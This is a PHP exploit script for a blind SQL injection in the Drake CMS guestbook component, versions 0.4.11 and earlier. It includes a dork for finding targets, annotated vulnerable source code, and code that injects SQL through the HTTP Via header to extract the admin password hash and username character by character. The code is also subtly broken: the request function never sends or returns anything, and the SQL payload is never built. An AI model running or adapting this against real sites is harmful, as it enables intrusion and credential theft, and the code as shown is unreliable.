Drake CMS <= 0.4.11 Remote Blind SQL Injection Exploit
======================================================



<?php

/*
	------------------------------------------------------
	Drake CMS <= 0.4.11 Remote Blind SQL Injection Exploit
	------------------------------------------------------

	author...: EgiX
	
	link.....: http://drakecms.sourceforge.net/
	dork.....: "Powered by Drake CMS" inurl:index.php?option=guestbook
	
	[-] Blind SQL Injection in /components/guestbook/guestbook.php

	15.	case "insert" :
	16.		if (!$my->gid) {
	17.			if (&#039;&#039; === ($gb_name = in(&#039;gb_name&#039;, __SQL | __NOHTML, $_POST, &#039;&#039;, 50))
	18.				|| (&#039;&#039; === ($gb_email = in(&#039;gb_email&#039;, __SQL | __NOHTML, $_POST, &#039;&#039;, 50)))
	19.				|| !is_email($gb_email)
	20.				)
	21.				CMSResponse::Back(_FORM_NC);
	22.		} else {
	23.			$gb_name = $my->name;
	24.			$gb_email = $my->email;
	25.		}
	26.	
	27.		$timeout = $params->get(&#039;timeout&#039;,5);
	28.	
	29.		$row = $conn->GetRow("SELECT id,ip,date FROM #__guestbook WHERE ip =&#039;".$my->GetIP()."&#039; AND date > &#039;".($time-($timeout*60))."&#039; "); <==
	30.	
	31.		if(!count($row)) {
	32.			if ($params->get(&#039;captcha&#039;) && !$my->valid_captcha())
	33.				break;
	34.			
	35.			$gb_url = in(&#039;gb_url&#039;, __SQL | __NOHTML, $_POST, &#039;&#039;);
	36.			$gb_country = in(&#039;gb_country&#039;, __SQL | __NOHTML, $_POST, &#039;&#039;, 50);
	37.			$gb_title = in(&#039;gb_title&#039;, __SQL | __NOHTML, $_POST, &#039;&#039;, 255);
	38.			$gb_message = in(&#039;gb_message&#039;, __SQL | __NOHTML, $_POST, &#039;&#039;);
	39.	
	40.			$conn->Insert(&#039;#__guestbook&#039;, &#039;(name,email,url,country,title,message,ip,date)&#039;,"&#039;$gb_name&#039;,&#039;$gb_email&#039;,&#039;$gb_url&#039;, (...)
	41.	
	42.		} else
	43.			echo _GUESTBOOK_DOUBLE_SIGN;
	
	if you analize GetIP() function defined into /classes/user.php (lines 61-66) you can see that an attacker
	could be inject arbitrary SQL code through http via header...this results in a blind SQL injection at line 29
	
	[-] look at /includes/retrieve_ip.php
	
	69.		if(isset($_SERVER[&#039;HTTP_VIA&#039;])) {
	70.			// case 2: 
	71.			// proxy && HTTP_(X_) FORWARDED (_FOR) not defined && HTTP_VIA defined
	72.			// other exotic variables may be defined 
	73.			return ( $_SERVER[&#039;HTTP_VIA&#039;].$x_coming_from.$coming_from ) ; <== this is the same value returned from GetIP()
	74.		}
	
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...\n";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function check_query($sql)
{
	global $host, $path;
	
	$payload = "gb_name=null&gb_email=foo%40bar.com&task=insert";
	$packet  = "POST {$path}index.php?option=guestbook HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Via: {$sql}\r\n";
	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$packet .= "Content-Length: ".strlen($payload)."\r\n";
	$packet .= "Connection: close\r\n\r\n";
	$packet .= $payload;

}

print "\n+----------------------------------------------------------------+";
print "\n| Drake CMS <= 0.4.11 Remote Blind SQL Injection Exploit by EgiX |";
print "\n+----------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nhost.......:	target server (ip/hostname)";
	print "\npath.......:	path to Drake CMS directory (example: / or /drake/)";
	print "\nuserid.....:	user id (default: 1 - admin)";
	die();
}

$host = $argv[1];
$path = $argv[2];
$uid  = (isset($argv[3]) ? $argv[3] : "1");

$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
$index = 1; $md5 = "";
print "\n[-] MD5 Hash: ";

while (!strpos($md5, chr(0)))
{
	for ($i = 0, $n = count($hash); $i <= $n; $i++)
	{
  		if ($i == $n) die("\n\n[-] Exploit failed...\n");
		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
	}

	$index++;
}

$char = array(0); // null char
for ($j = 97; $j <= 122; $j++) $char = array_merge($char, array($j)); // a-z
for ($j = 65; $j <= 90; $j++) $char = array_merge($char, array($j)); // A-Z
for ($j = 48; $j <= 57; $j++) $char = array_merge($char, array($j)); // 0-9

$index = 1; $user = "";
print "\n[-] Username: ";

while (!strpos($user, chr(0)))
{
	for ($i = 0, $n = count($char); $i <= $n; $i++)
	{
  		if ($i == $n) die("\n\n[-] Exploit failed...\n");
		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; }
	}

	$index++;
}

print "\n\n[-] Successfull!\n";

?>




